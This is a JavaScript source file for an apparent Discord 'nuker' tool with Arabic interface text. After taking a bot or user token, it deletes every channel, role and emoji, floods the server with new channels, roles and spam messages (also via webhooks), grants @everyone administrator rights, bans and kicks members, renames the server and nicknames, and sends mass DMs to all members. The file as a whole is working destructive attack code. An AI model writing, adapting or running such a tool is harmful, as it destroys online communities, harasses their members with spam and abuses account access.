const API_BASE = "/api";
const UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36";

let AUTH_TOKEN = "";
let GUILD_ID = "";
let BOT_USER = null;
let GUILD_CHANNELS = [];
let GUILD_MEMBERS = [];
let GUILD_ROLES = [];
let guildsCache = [];

const $ = (sel) => document.querySelector(sel);
const $$ = (sel) => document.querySelectorAll(sel);

function log(msg, type = "info") {
  const area = $("#logArea");
  const line = document.createElement("div");
  line.className = `log-line log-${type}`;
  line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
  area.appendChild(line);
  area.scrollTop = area.scrollHeight;
}

function toast(msg, type = "info") {
  const t = document.createElement("div");
  t.className = `toast ${type}`;
  t.textContent = msg;
  document.body.appendChild(t);
  setTimeout(() => t.remove(), 2500);
}

function showModal(title, html) {
  return new Promise((resolve) => {
    $("#modalTitle").textContent = title;
    $("#modalText").innerHTML = html;
    $("#modalConfirm").textContent = "Confirm";
    $("#modalCancel").classList.remove("hidden");
    $("#modalOverlay").classList.remove("hidden");
    const cleanup = (val) => {
      $("#modalOverlay").classList.add("hidden");
      $("#modalConfirm").removeEventListener("click", onConfirm);
      $("#modalCancel").removeEventListener("click", onCancel);
      resolve(val);
    };
    const onConfirm = () => cleanup(true);
    const onCancel = () => cleanup(false);
    $("#modalConfirm").addEventListener("click", onConfirm);
    $("#modalCancel").addEventListener("click", onCancel);
  });
}

function setProgress(barId, percent) {
  $(`#${barId}`).style.width = `${Math.min(100, Math.max(0, percent))}%`;
}

function api(path, options = {}) {
  const headers = new Headers({
    "Authorization": AUTH_TOKEN,
    "Content-Type": "application/json",
    "User-Agent": UA,
    "Accept": "application/json"
  });
  if (options.headers) {
    options.headers.forEach((v, k) => headers.set(k, v));
  }
  return fetch(`${API_BASE}${path}`, {
    ...options,
    headers,
    credentials: "omit",
    cache: "no-store"
  }).then(r => {
    if (r.status === 429) {
      const retry = r.headers.get("Retry-After");
      const err = new Error("Rate limited");
      err.retryAfter = retry ? parseInt(retry) * 1000 : 1000;
      err.status = 429;
      throw err;
    }
    return r;
  });
}

async function connect() {
  const token = $("#botToken").value.trim();
  if (!token) return toast("Bot Token مطلوب", "error");

  $("#btnConnect").disabled = true;
  $("#btnConnect").textContent = "جاري التحقق...";
  log("جاري التحقق من التوكن...");

  try {
    const user = await checkToken(token);
    if (!user) throw new Error("فشل التحقق");

    AUTH_TOKEN = token.startsWith("Bot ") ? token : (user._isBot ? `Bot ${token}` : token);
    BOT_USER = user;

    log(`تم تسجيل الدخول: ${user.username} (${user.id})`, "success");
    $("#connStatus").innerHTML = `<span class="log-success">✓ ${user.username}</span>`;
    $("#btnConnect").classList.add("hidden");
    $("#btnDisconnect").disabled = false;

    log("جاري جلب السيرفرات...", "info");
    guildsCache = await getUserGuilds();
    if (!guildsCache.length) throw new Error("البوت غير موجود في أي سيرفر");

    showGuildSelector(guildsCache);
  } catch (e) {
    $("#btnConnect").disabled = false;
    $("#btnConnect").textContent = "🔗 Connect";
    toast(e.message || "فشل الاتصال", "error");
    log(`خطأ: ${e.message}`, "error");
  }
}

async function checkToken(token) {
  const r = await api("/users/@me", { headers: { "Authorization": token } });
  if (r.ok) return r.json();
  if (r.status === 401) {
    const br = await api("/users/@me", { headers: { "Authorization": `Bot ${token}` } });
    if (br.ok) return { ...await br.json(), _isBot: true };
  }
  return null;
}

async function getUserGuilds() {
  const r = await api("/users/@me/guilds");
  return r.ok ? r.json() : [];
}

function showGuildSelector(guilds) {
  const html = guilds.map(g => `
    <div class="guild-card" data-id="${g.id}" tabindex="0" role="button" aria-label="${g.name}">
      <img class="guild-icon" src="https://cdn.discordapp.com/icons/${g.id}/${g.icon}.png?size=64" alt="" loading="lazy" onerror="this.style.display='none'">
      <div class="guild-name">${g.name}</div>
      <div class="guild-meta">${g.approximate_member_count || '?'} عضو</div>
    </div>
  `).join("");

  $("#modalTitle").textContent = `اختر السيرفر (${guilds.length})`;
  $("#modalText").innerHTML = `<div class="guild-grid">${html}</div>`;
  $("#modalConfirm").textContent = "إلغاء";
  $("#modalCancel").classList.add("hidden");
  $("#modalOverlay").classList.remove("hidden");

  $$("#modalOverlay .guild-card").forEach(card => {
    card.addEventListener("click", () => selectGuild(card.dataset.id));
    card.addEventListener("keydown", e => { if (e.key === "Enter") card.click(); });
  });

  const cleanup = () => {
    $("#modalOverlay").classList.add("hidden");
    $("#modalCancel").classList.remove("hidden");
    $("#modalConfirm").textContent = "Confirm";
  };
  $("#modalConfirm").onclick = () => { $("#modalOverlay").classList.add("hidden"); disconnect(); };
}

async function selectGuild(guildId) {
  GUILD_ID = guildId;
  const guild = guildsCache.find(g => g.id === guildId);
  $("#modalOverlay").classList.add("hidden");
  log(`تم اختيار: ${guild?.name || guildId}`, "success");

  log("جاري تحميل البيانات...", "info");
  const [channels, members, roles] = await Promise.all([
    getGuildChannels(),
    getGuildMembers(),
    getGuildRoles()
  ]);

  GUILD_CHANNELS = channels;
  GUILD_MEMBERS = members;
  GUILD_ROLES = roles;

  log(`✓ ${channels.length} قناة، ${members.length} عضو، ${roles.length} رتبة`, "success");

  $$(".tab-btn").forEach(b => b.disabled = false);
  $$("#tab-nuker button, #tab-dm button, #tab-rename button").forEach(b => b.disabled = false);

  const g = guildsCache.find(g => g.id === GUILD_ID);
  $("#connStatus").innerHTML = `<span class="log-success">✓ ${BOT_USER.username} | ${g?.name || GUILD_ID}</span>`;
  toast("تم الاتصال", "success");
}

async function getGuildChannels() {
  const r = await api(`/guilds/${GUILD_ID}/channels`);
  return r.ok ? r.json() : [];
}

async function getGuildMembers() {
  let all = [], after = "";
  while (true) {
    const r = await api(`/guilds/${GUILD_ID}/members?limit=1000${after ? `&after=${after}` : ""}`);
    if (!r.ok || !r.body) break;
    const data = await r.json();
    if (!data?.length) break;
    all.push(...data);
    after = data[data.length - 1].user.id;
    if (data.length < 1000) break;
  }
  return all;
}

async function getGuildRoles() {
  const r = await api(`/guilds/${GUILD_ID}/roles`);
  return r.ok ? r.json() : [];
}

function disconnect() {
  AUTH_TOKEN = ""; GUILD_ID = ""; BOT_USER = null;
  GUILD_CHANNELS = []; GUILD_MEMBERS = []; GUILD_ROLES = [];
  $("#botToken").value = "";
  $("#connStatus").textContent = "غير متصل";
  $("#btnConnect").disabled = false; $("#btnConnect").textContent = "🔗 Connect"; $("#btnConnect").classList.remove("hidden");
  $("#btnDisconnect").disabled = true;
  $$(".tab-btn").forEach(b => { if (b.dataset.tab !== "nuker") b.disabled = true; });
  $$("#tab-nuker button, #tab-dm button, #tab-rename button").forEach(b => b.disabled = true);
  setProgress("nukerProgress", 0); setProgress("dmProgress", 0); setProgress("renameProgress", 0);
  $("#dmStats").style.display = "none"; $("#renameStats").style.display = "none";
  $("#logArea").innerHTML = "";
  log("تم قطع الاتصال");
  toast("تم قطع الاتصال");
}

function log(msg, type = "info") {
  const area = $("#logArea");
  const line = document.createElement("div");
  line.className = `log-line log-${type}`;
  line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
  area.appendChild(line);
  area.scrollTop = area.scrollHeight;
}

function toast(msg, type = "info") {
  const t = document.createElement("div");
  t.className = `toast ${type}`;
  t.textContent = msg;
  document.body.appendChild(t);
  setTimeout(() => t.remove(), 2500);
}

function setProgress(id, p) { $(`#${id}`).style.width = `${Math.min(100, Math.max(0, p))}%`; }

function showModal(title, html) {
  return new Promise(resolve => {
    $("#modalTitle").textContent = title;
    $("#modalText").innerHTML = html;
    $("#modalConfirm").textContent = "Confirm";
    $("#modalCancel").classList.remove("hidden");
    $("#modalOverlay").classList.remove("hidden");
    const done = v => { $("#modalOverlay").classList.add("hidden"); $("#modalConfirm").onclick = null; $("#modalCancel").onclick = null; resolve(v); };
    $("#modalConfirm").onclick = () => done(true);
    $("#modalCancel").onclick = () => done(false);
  });
}

async function runNukerAction(action) {
  const labels = {
    deleteChannels: "حذف جميع القنوات؟",
    createChannels: "إنشاء قنوات جديدة؟",
    spam: "سبام في جميع القنوات؟",
    renameGuild: "تغيير اسم السيرفر؟",
    adminEveryone: "إعطاء @everyone Admin؟",
    banAll: "حظر جميع الأعضاء؟",
    kickAll: "طرد جميع الأعضاء؟",
    deleteRoles: "حذف جميع الرتب؟",
    createRoles: "إنشاء رتب جديدة؟",
    deleteEmojis: "حذف جميع الإيموجي؟",
    nicknames: "تغيير نيكنيم جميع الأعضاء؟"
  };
  if (!(await showModal("تأكيد", labels[action]))) return;

  const btn = $(`#nuke${action.charAt(0).toUpperCase() + action.slice(1)}`);
  btn.disabled = true;
  setProgress("nukerProgress", 0);

  try {
    switch (action) {
      case "deleteChannels": await deleteAllChannels(); break;
      case "createChannels": await createChannels(); break;
      case "spam": await spamChannels(); break;
      case "renameGuild": await renameGuild(); break;
      case "adminEveryone": await adminEveryone(); break;
      case "banAll": await banAll(); break;
      case "kickAll": await kickAll(); break;
      case "deleteRoles": await deleteRoles(); break;
      case "createRoles": await createRoles(); break;
      case "deleteEmojis": await deleteEmojis(); break;
      case "nicknames": await nicknameAll(); break;
    }
    toast("اكتمل", "success");
  } catch (e) {
    log(`خطأ: ${e.message}`, "error");
    toast("فشل", "error");
  }
  btn.disabled = false;
  setProgress("nukerProgress", 100);
}

async function deleteAllChannels() {
  const chs = GUILD_CHANNELS;
  let done = 0;
  for (const ch of chs) {
    await api(`/channels/${ch.id}`, { method: "DELETE" });
    done++;
    setProgress("nukerProgress", (done / chs.length) * 100);
    log(`تم حذف: ${ch.name}`, "success");
  }
  log(`تم حذف ${done} قناة`, "success");
  GUILD_CHANNELS = await getGuildChannels();
}

async function createChannels() {
  const names = ($("#setChannelNames").value.split(",").map(s => s.trim()).filter(Boolean));
  const count = parseInt($("#setChannelCount").value) || 90;
  if (!names.length) return toast("أضف أسماء قنوات في الإعدادات", "error");

  let created = 0;
  for (let i = 0; i < count; i += 50) {
    const batch = Array.from({ length: Math.min(50, count - i) }, (_, j) => ({
      name: names[(i + j) % names.length],
      type: 0
    }));
    const results = await Promise.allSettled(batch.map(b =>
      api(`/guilds/${GUILD_ID}/channels`, { method: "POST", body: JSON.stringify(b) })
    ));
    created += results.filter(r => r.status === "fulfilled" && r.value.ok).length;
    setProgress("nukerProgress", (created / count) * 100);
  }
  log(`تم إنشاء ${created} قناة`, "success");
  GUILD_CHANNELS = await getGuildChannels();
}

async function spamChannels() {
  const msgs = ($("#setSpamMessages").value.split(",").map(s => s.trim()).filter(Boolean));
  const count = parseInt($("#setSpamCount").value) || 3;
  const mode = $("#setSpamMode").value;
  if (!msgs.length) return toast("أضف رسائل سبام في الإعدادات", "error");

  const textChs = GUILD_CHANNELS.filter(c => c.type === 0);
  let sent = 0, total = textChs.length * count;

  if (mode === "webhook") {
    for (const ch of textChs) {
      const wh = await api(`/channels/${ch.id}/webhooks`, { method: "POST", body: JSON.stringify({ name: $("#setWhName").value }) });
      if (!wh.ok) continue;
      const url = (await wh.json())?.url;
      if (!url) continue;
      for (let i = 0; i < count; i++) {
        await fetch((await wh.json()).url, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ content: msgs[i % msgs.length] }) });
        sent++; setProgress("nukerProgress", (sent / total) * 100);
      }
    }
  } else {
    for (const ch of textChs) {
      for (let i = 0; i < count; i++) {
        await api(`/channels/${ch.id}/messages`, { method: "POST", body: JSON.stringify({ content: msgs[i % msgs.length] }) });
        sent++; setProgress("nukerProgress", (sent / total) * 100);
      }
    }
  }
  log(`تم إرسال ${sent} رسالة`, "success");
}

async function renameGuild() {
  const name = $("#setGuildName").value.trim();
  if (!name) return toast("أضف اسم السيرفر في الإعدادات", "error");
  const r = await api(`/guilds/${GUILD_ID}`, { method: "PATCH", body: JSON.stringify({ name }) });
  if (r.ok) log("تم تغيير اسم السيرفر", "success");
}

async function adminEveryone() {
  const everyone = GUILD_ROLES.find(r => r.id === GUILD_ID);
  if (everyone) {
    await api(`/guilds/${GUILD_ID}/roles/${GUILD_ID}`, { method: "PATCH", body: JSON.stringify({ permissions: "8" }) });
    log("تم إعطاء @everyone Admin", "success");
  }
}

async function banAll() {
  const members = GUILD_MEMBERS.filter(m => m.user.id !== BOT_USER.id).slice(0, 40);
  let done = 0;
  for (const m of members) {
    await api(`/guilds/${GUILD_ID}/bans/${m.user.id}`, { method: "PUT", body: JSON.stringify({ delete_message_days: 7 }) });
    done++; setProgress("nukerProgress", (done / members.length) * 100);
  }
  log(`تم حظر ${done} عضو`, "success");
}

async function kickAll() {
  const members = GUILD_MEMBERS.filter(m => m.user.id !== BOT_USER.id && !m.user.bot).slice(0, 40);
  let done = 0;
  for (const m of members) {
    await api(`/guilds/${GUILD_ID}/members/${m.user.id}`, { method: "DELETE" });
    done++; setProgress("nukerProgress", (done / members.length) * 100);
  }
  log(`تم طرد ${done} عضو`, "success");
}

async function deleteRoles() {
  const roles = GUILD_ROLES.filter(r => r.id !== GUILD_ID && !r.managed);
  let done = 0;
  for (const r of roles) {
    await api(`/guilds/${GUILD_ID}/roles/${r.id}`, { method: "DELETE" });
    done++; setProgress("nukerProgress", (done / roles.length) * 100);
  }
  log(`تم حذف ${done} رتبة`, "success");
  GUILD_ROLES = await getGuildRoles();
}

async function createRoles() {
  const names = ($("#setRoleNames").value.split(",").map(s => s.trim()).filter(Boolean));
  const count = parseInt($("#setRoleCount").value) || 10;
  if (!names.length) return toast("أضف أسماء رتب في الإعدادات", "error");

  let created = 0;
  for (let i = 0; i < count; i++) {
    const name = names[i % names.length];
    const r = await api(`/guilds/${GUILD_ID}/roles`, { method: "POST", body: JSON.stringify({ name, color: Math.floor(Math.random() * 0xffffff) }) });
    if (r.ok) created++;
    setProgress("nukerProgress", ((i + 1) / count) * 100);
  }
  log(`تم إنشاء ${created} رتبة`, "success");
  GUILD_ROLES = await getGuildRoles();
}

async function deleteEmojis() {
  const r = await api(`/guilds/${GUILD_ID}/emojis`);
  if (!r.ok) return;
  const emojis = await r.json();
  let done = 0;
  for (const e of emojis) {
    await api(`/guilds/${GUILD_ID}/emojis/${e.id}`, { method: "DELETE" });
    done++; setProgress("nukerProgress", (done / emojis.length) * 100);
  }
  log(`تم حذف ${done} إيموجي`, "success");
}

async function nicknameAll() {
  const nick = $("#setNickname").value.trim();
  if (!nick) return toast("أضف النيكنيم في الإعدادات", "error");
  const members = GUILD_MEMBERS.filter(m => !m.user.bot);
  let done = 0;
  for (const m of members) {
    const r = await api(`/guilds/${GUILD_ID}/members/${m.user.id}`, { method: "PATCH", body: JSON.stringify({ nick }) });
    if (r.ok || r.status === 204) done++;
    setProgress("nukerProgress", (done / members.length) * 100);
  }
  log(`تم تغيير ${done} نيكنيم`, "success");
}

async function runMassDM() {
  const msg = $("#dmMessage").value.trim();
  if (!msg) return toast("اكتب رسالة", "error");
  const targets = GUILD_MEMBERS.filter(m => !m.user.bot && m.user.id !== BOT_USER.id);
  if (!(await showModal("تأكيد", `إرسال رسالة لـ ${targets.length} عضو؟`))) return;

  $("#btnMassDM").disabled = true;
  $("#dmStats").style.display = "flex";
  setProgress("dmProgress", 0);
  let sent = 0, failed = 0;

  for (let i = 0; i < targets.length; i++) {
    const m = targets[i];
    const dm = await api("/users/@me/channels", { method: "POST", body: JSON.stringify({ recipient_id: m.user.id }) });
    if (dm.ok) {
      const ch = await dm.json();
      const res = await api(`/channels/${ch.id}/messages`, { method: "POST", body: JSON.stringify({ content: $("#dmMessage").value }) });
      if (res.ok) sent++; else failed++;
    } else failed++;
    setProgress("dmProgress", ((i + 1) / targets.length) * 100);
    $("#dmSent").textContent = sent;
    $("#dmFailed").textContent = failed;
    $("#dmTotal").textContent = targets.length;
    await new Promise(r => setTimeout(r, 120));
  }
  log(`DM: ${sent} ✅، ${failed} ❌`, sent > failed ? "success" : "error");
  $("#btnMassDM").disabled = false;
  toast("اكتمل", "success");
}

async function runRenameChannels() {
  const prefix = $("#renamePrefix").value.trim();
  if (!prefix) return toast("اكتب البادئة", "error");
  const textChs = GUILD_CHANNELS.filter(c => c.type === 0);
  if (!(await showModal("تأكيد", `إعادة تسمية ${textChs.length} قناة نصية؟`))) return;

  $("#btnRenameChannels").disabled = true;
  $("#renameStats").style.display = "flex";
  setProgress("renameProgress", 0);
  let renamed = 0;

  const CONCURRENCY = 60;
  for (let i = 0; i < textChs.length; i += CONCURRENCY) {
    const batch = textChs.slice(i, i + CONCURRENCY);
    await Promise.allSettled(batch.map((ch, idx) =>
      api(`/channels/${ch.id}`, { method: "PATCH", body: JSON.stringify({ name: `${prefix}-${i + idx + 1}` }) })
    ));
    renamed += batch.length;
    setProgress("renameProgress", ((i + batch.length) / textChs.length) * 100);
    $("#renameCount").textContent = renamed;
    $("#renameTotal").textContent = textChs.length;
  }
  log(`تم إعادة تسمية ${renamed} قناة`, "success");
  GUILD_CHANNELS = await getGuildChannels();
  $("#btnRenameChannels").disabled = false;
  toast("اكتمل", "success");
}

function saveSettings() {
  const s = {
    channel_names: ($("#setChannelNames").value.split(",").map(x => x.trim()).filter(Boolean)),
    channel_count: parseInt($("#setChannelCount").value) || 90,
    spam_messages: ($("#setSpamMessages").value.split(",").map(x => x.trim()).filter(Boolean)),
    spam_count: parseInt($("#setSpamCount").value) || 3,
    spam_mode: $("#setSpamMode").value,
    wh_name: $("#setWhName").value,
    role_names: ($("#setRoleNames").value.split(",").map(x => x.trim()).filter(Boolean)),
    role_count: parseInt($("#setRoleCount").value) || 10,
    guild_name: $("#setGuildName").value.trim(),
    channel_create: $("#setChannelCreate").checked,
    channel_delete: $("#setChannelDelete").checked,
    give_admin: $("#setGiveAdmin").checked,
    ban_all: $("#setBanAll").checked,
    kick_all: $("#setKickAll").checked,
    role_create: $("#setRoleCreate").checked,
    role_delete: $("#setRoleDelete").checked,
    delete_emojis: $("#setDeleteEmojis").checked,
    nickname_all: $("#setNicknameAll").checked,
    nickname: $("#setNickname").value.trim()
  };
  localStorage.setItem("tool12_settings", JSON.stringify(s));
  toast("تم حفظ الإعدادات", "success");
}

function loadSettings() {
  const s = JSON.parse(localStorage.getItem("tool12_settings") || "{}");
  $("#setChannelNames").value = (s.channel_names || []).join(", ");
  $("#setChannelCount").value = s.channel_count || 90;
  $("#setSpamMessages").value = (s.spam_messages || []).join(", ");
  $("#setSpamCount").value = s.spam_count || 3;
  $("#setSpamMode").value = s.spam_mode || "normal";
  $("#setWhName").value = s.wh_name || "TRJ";
  $("#setRoleNames").value = (s.role_names || []).join(", ");
  $("#setRoleCount").value = s.role_count || 10;
  $("#setGuildName").value = s.guild_name || "";
  $("#setChannelCreate").checked = s.channel_create !== false;
  $("#setChannelDelete").checked = s.channel_delete !== false;
  $("#setGiveAdmin").checked = s.give_admin !== false;
  $("#setBanAll").checked = !!s.ban_all;
  $("#setKickAll").checked = !!s.kick_all;
  $("#setRoleCreate").checked = !!s.role_create;
  $("#setRoleDelete").checked = !!s.role_delete;
  $("#setDeleteEmojis").checked = !!s.delete_emojis;
  $("#setNicknameAll").checked = !!s.nickname_all;
  $("#setNickname").value = s.nickname || "";
}

$$(".tab-btn").forEach(btn => {
  btn.addEventListener("click", () => {
    $$(".tab-btn").forEach(b => b.classList.remove("active"));
    $$(".tab-panel").forEach(p => p.classList.remove("active"));
    btn.classList.add("active");
    $(`#tab-${btn.dataset.tab}`).classList.add("active");
  });
});

$("#btnConnect").addEventListener("click", connect);
$("#btnDisconnect").addEventListener("click", disconnect);

$$("#nukeDeleteChannels, #nukeCreateChannels, #nukeSpam, #nukeRenameGuild, #nukeAdminEveryone, #nukeBanAll, #nukeKickAll, #nukeDeleteRoles, #nukeCreateRoles, #nukeDeleteEmojis, #nukeNicknames")
  .forEach(btn => btn.addEventListener("click", () => runNukerAction(btn.id.replace("nuke", "").replace(/([A-Z])/g, (_, l) => l.toLowerCase()))));

$("#btnMassDM").addEventListener("click", runMassDM);
$("#btnRenameChannels").addEventListener("click", runRenameChannels);
$("#btnSaveSettings").addEventListener("click", saveSettings);

loadSettings();
log("TRJ Tool12 Edge Ready");
log("أدخل Bot Token ثم Connect — سيعرض السيرفرات تلقائياً");